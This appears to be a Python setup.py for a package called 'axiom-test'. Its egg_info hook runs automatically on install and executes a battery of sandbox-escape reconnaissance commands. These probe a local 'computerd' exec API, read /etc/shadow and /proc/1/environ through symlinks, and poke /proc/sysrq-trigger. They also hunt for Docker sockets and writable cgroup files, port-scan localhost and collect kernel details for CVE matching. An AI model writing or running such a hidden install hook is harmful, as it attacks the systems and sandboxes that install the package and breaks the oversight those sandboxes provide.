from setuptools import setup, find_packages
from setuptools.command.egg_info import egg_info
import subprocess, os

class PostEggInfo(egg_info):
    def run(self):
        egg_info.run(self)
        out_dir = "/mnt/data/output"
        os.makedirs(out_dir, exist_ok=True)
        log = os.path.join(out_dir, "init.log")
        with open(log, "w") as f:
            f.write("=== HOOK FIRED v0.7.0 ===\n")
            for label, cmd in [
                # --- computerd API enumeration ---
                ("computerd health", "curl -sS http://127.0.0.1:8080/health 2>&1"),
                ("computerd root", "curl -sS http://127.0.0.1:8080/ 2>&1"),
                ("computerd api", "curl -sS http://127.0.0.1:8080/api 2>&1"),
                ("computerd metrics", "curl -sS http://127.0.0.1:8080/metrics 2>&1"),
                ("computerd debug", "curl -sS http://127.0.0.1:8080/debug 2>&1"),
                ("computerd exec", "curl -sS http://127.0.0.1:8080/exec 2>&1"),
                ("computerd containers", "curl -sS http://127.0.0.1:8080/containers 2>&1"),
                ("computerd status", "curl -sS http://127.0.0.1:8080/status 2>&1"),
                ("computerd info", "curl -sS http://127.0.0.1:8080/info 2>&1"),
                ("computerd version", "curl -sS http://127.0.0.1:8080/version 2>&1"),
                ("computerd config", "curl -sS http://127.0.0.1:8080/config 2>&1"),
                ("computerd POST exec", "curl -sS -X POST http://127.0.0.1:8080/exec -d '{\"cmd\":\"id\"}' -H 'Content-Type: application/json' 2>&1"),
                ("computerd common paths", "for p in /v1 /v1/containers /run /shell /ws /attach /logs /top /inspect /__admin /__internal; do echo \"--- :8080$p ---\"; curl -sS -o /dev/null -w '%{http_code}' http://127.0.0.1:8080$p 2>&1; echo; done"),

                # --- Node.js debug port ---
                ("node inspect 9229", "curl -sS http://127.0.0.1:9229/json 2>&1 || echo 'not open'"),
                ("node inspect 9230", "curl -sS http://127.0.0.1:9230/json 2>&1 || echo 'not open'"),

                # --- Leaked file descriptors ---
                ("self fd list", "ls -la /proc/self/fd/ 2>/dev/null"),
                ("parent fd list", "ls -la /proc/$PPID/fd/ 2>/dev/null"),
                ("proc 89 fd", "ls -la /proc/89/fd/ 2>/dev/null || echo 'not readable'"),
                ("interesting fds", "for p in /proc/[0-9]*/fd; do if [ -r \"$p\" ]; then ls -la $p 2>/dev/null | grep -v 'pipe\\|socket\\|/dev/null\\|/dev/pts\\|anon_inode' | head -5; fi; done"),

                # --- FUSE symlink traversal ---
                ("symlink test etc shadow", "ln -sf /etc/shadow /mnt/data/output/test_shadow 2>&1 && cat /mnt/data/output/test_shadow 2>&1 || echo 'blocked'"),
                ("symlink test root dir", "ln -sf /root /mnt/data/output/test_root 2>&1 && ls -la /mnt/data/output/test_root/ 2>&1 || echo 'blocked'"),
                ("symlink test proc1", "ln -sf /proc/1/environ /mnt/data/output/test_proc1 2>&1 && cat /mnt/data/output/test_proc1 2>&1 || echo 'blocked'"),

                # --- Writable proc/sys paths ---
                ("sysrq", "echo t > /proc/sysrq-trigger 2>&1 || echo 'denied'"),
                ("cgroup writable", "find /sys/fs/cgroup -writable -type f 2>/dev/null | head -10"),
                ("proc writable", "find /proc/self -writable -type f 2>/dev/null | head -20"),
                ("sys writable", "find /sys -writable -type f 2>/dev/null | head -10"),

                # --- Docker/container runtime sockets ---
                ("docker socket", "ls -la /var/run/docker.sock 2>/dev/null || echo 'none'"),
                ("containerd socket", "ls -la /run/containerd/containerd.sock 2>/dev/null || echo 'none'"),
                ("cri socket", "find /var/run /run -name '*.sock' 2>/dev/null"),

                # --- Port scan for internal services ---
                ("port scan", "for port in 80 443 2375 2376 3000 4243 5000 6443 8080 8443 9229 9230 10250 10255; do (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && echo \"$port OPEN\" || echo \"$port closed\"; done"),

                # --- Kernel version for CVE matching ---
                ("kernel", "uname -a"),
                ("os release", "cat /etc/os-release 2>/dev/null"),
                ("seccomp status", "cat /proc/self/status | grep -i seccomp"),
            ]:
                f.write(f"--- {label} ---\n")
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    f.write(result.stdout)
                    if result.stderr:
                        f.write(f"STDERR: {result.stderr}")
                except Exception as e:
                    f.write(f"ERROR: {e}\n")

setup(
    name="axiom-test",
    version="0.7.0",
    packages=find_packages(),
    cmdclass={"egg_info": PostEggInfo},
)
